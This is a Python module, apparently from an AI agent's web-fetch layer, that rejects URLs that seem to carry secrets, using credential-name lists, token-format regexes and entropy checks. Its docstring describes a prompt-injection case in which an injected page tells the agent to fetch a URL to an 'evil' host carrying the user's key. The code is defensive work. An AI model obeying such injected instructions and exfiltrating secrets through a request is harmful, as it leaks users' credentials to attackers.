"""Refuse URLs that look like they carry a secret (exfiltration channel).

An injected page can tell the agent to call ``resolve_url("https://evil/?k=<the
user's key>")``: the GET itself delivers the secret to the attacker, whatever
NINA does with the answer. Anthropic's own web fetch tool refuses such URLs;
NINA does the same, deterministically, before any network access, for
``resolve`` and for every ``assemble`` URL (and so for MCP).

A URL is refused when it has:

* userinfo (``https://user:pass@host/``);
* a query or fragment parameter, with a non-empty value, whose NAME is a
  credential name (``token``, ``api_key``, ``secret``, ``X-Amz-Signature``...);
* a path segment or parameter value in a known secret format (OpenAI/Anthropic
  ``sk-``, GitHub ``ghp_``/``github_pat_``, AWS ``AKIA``/``ASIA``, Slack
  ``xox*-``, Google ``AIza``, GitLab ``glpat-``, a JWT, a PEM header);
* a query or fragment VALUE that is a long high-entropy string (32+ hex chars,
  or 32+ base64 chars mixing upper case, lower case and digits).

The generic high-entropy rule is NOT applied to path segments: documentation
permalinks carry commit SHAs and hashes in the path. Words alone (``/api/keys``,
``?q=token``, ``#authentication``) never trigger.
"""

from __future__ import annotations

import math
import re
from collections import Counter
from urllib.parse import parse_qsl, unquote, urlsplit

from app.fetch.errors import UrlRejectedSecret

_CREDENTIAL_NAMES = frozenset(
    {
        "token",
        "access_token",
        "accesstoken",
        "id_token",
        "refresh_token",
        "auth_token",
        "private_token",
        "api_key",
        "apikey",
        "key",
        "secret",
        "client_secret",
        "password",
        "passwd",
        "auth",
        "authorization",
        "session",
        "sessionid",
        "session_id",
        "sig",
        "signature",
        "x_amz_signature",
        "x_amz_security_token",
        "x_amz_credential",
        "x_goog_signature",
        "x_goog_credential",
    }
)
_CREDENTIAL_SUFFIXES = ("_token", "_secret", "_signature", "_password", "_api_key")

_SECRET_FORMATS = (
    # OpenAI / Anthropic style: sk-, sk-proj-, sk-ant-... (mixed case + digits
    # required below, so slugs like "sk-learn-user-guide" pass).
    re.compile(r"(?<![A-Za-z0-9])sk-(?:ant-|proj-)?[A-Za-z0-9_-]{20,}"),
    re.compile(r"(?<![A-Za-z0-9])gh[pousr]_[A-Za-z0-9]{30,}"),
    re.compile(r"(?<![A-Za-z0-9])github_pat_[A-Za-z0-9_]{22,}"),
    re.compile(r"(?<![A-Za-z0-9])(?:AKIA|ASIA)[A-Z0-9]{16}(?![A-Za-z0-9])"),
    re.compile(r"(?<![A-Za-z0-9])xox[abposr]-[A-Za-z0-9-]{10,}"),
    re.compile(r"(?<![A-Za-z0-9])AIza[0-9A-Za-z_-]{35}"),
    re.compile(r"(?<![A-Za-z0-9])glpat-[0-9A-Za-z_-]{20,}"),
    re.compile(r"eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}"),
    re.compile(r"-----BEGIN [A-Z ]*(?:PRIVATE KEY|CERTIFICATE)"),
)
#: Formats whose match must also mix case and digits to count (see above).
_NEEDS_MIXED = frozenset({0})

_HEX = re.compile(r"[0-9a-fA-F]{32,}")
_B64 = re.compile(r"[A-Za-z0-9+/_-]{32,}={0,2}")


def _mixed(token: str) -> bool:
    return (
        any(c.isupper() for c in token)
        and any(c.islower() for c in token)
        and any(c.isdigit() for c in token)
    )


def _entropy(token: str) -> float:
    counts = Counter(token)
    n = len(token)
    return -sum(c / n * math.log2(c / n) for c in counts.values())


def _known_format(value: str) -> str | None:
    for index, pattern in enumerate(_SECRET_FORMATS):
        for match in pattern.finditer(value):
            if index in _NEEDS_MIXED and not _mixed(match.group(0)):
                continue
            return "a value in a known secret format"
    return None


def _high_entropy(value: str) -> str | None:
    for match in _HEX.finditer(value):
        if len(match.group(0)) >= 32:
            return "a long hexadecimal value"
    for match in _B64.finditer(value):
        token = match.group(0).rstrip("=")
        digits = sum(c.isdigit() for c in token)
        upper = sum(c.isupper() for c in token)
        lower = sum(c.islower() for c in token)
        if digits >= 4 and upper >= 2 and lower >= 2 and _entropy(token) >= 4.2:
            return "a long high-entropy value"
    return None


def _normalized_name(name: str) -> str:
    return name.strip().lower().replace("-", "_")


def _is_credential_name(name: str) -> bool:
    norm = _normalized_name(name)
    return norm in _CREDENTIAL_NAMES or norm.endswith(_CREDENTIAL_SUFFIXES)


def find_secret(url: str) -> str | None:
    """The reason ``url`` looks like it carries a secret, or ``None``."""
    try:
        parts = urlsplit(url)
        if parts.username is not None or parts.password is not None:
            return "credentials in the URL (userinfo)"
    except ValueError:
        return None  # Malformed: the guard rejects it with its own error.

    for segment in parts.path.split("/"):
        reason = _known_format(unquote(segment))
        if reason:
            return f"{reason} in the path"

    for where, raw in (("query", parts.query), ("fragment", parts.fragment)):
        for name, value in parse_qsl(raw, keep_blank_values=True):
            if not value.strip():
                continue
            if _is_credential_name(name):
                return f"a credential parameter ({name!r}) in the {where}"
            reason = _known_format(value) or _high_entropy(value)
            if reason:
                return f"{reason} in the {where}"
        if where == "fragment" and raw and "=" not in raw:
            reason = _known_format(unquote(raw))
            if reason:
                return f"{reason} in the fragment"
    return None


def reject_secret_url(url: str) -> None:
    """Raise :class:`UrlRejectedSecret` if ``url`` looks like it carries a secret.

    The message names the rule, never the matched value (no echo of a secret).
    """
    reason = find_secret(url)
    if reason is not None:
        raise UrlRejectedSecret(
            f"URL refused: it looks like it carries a secret ({reason})",
            details={"reason": reason},
        )
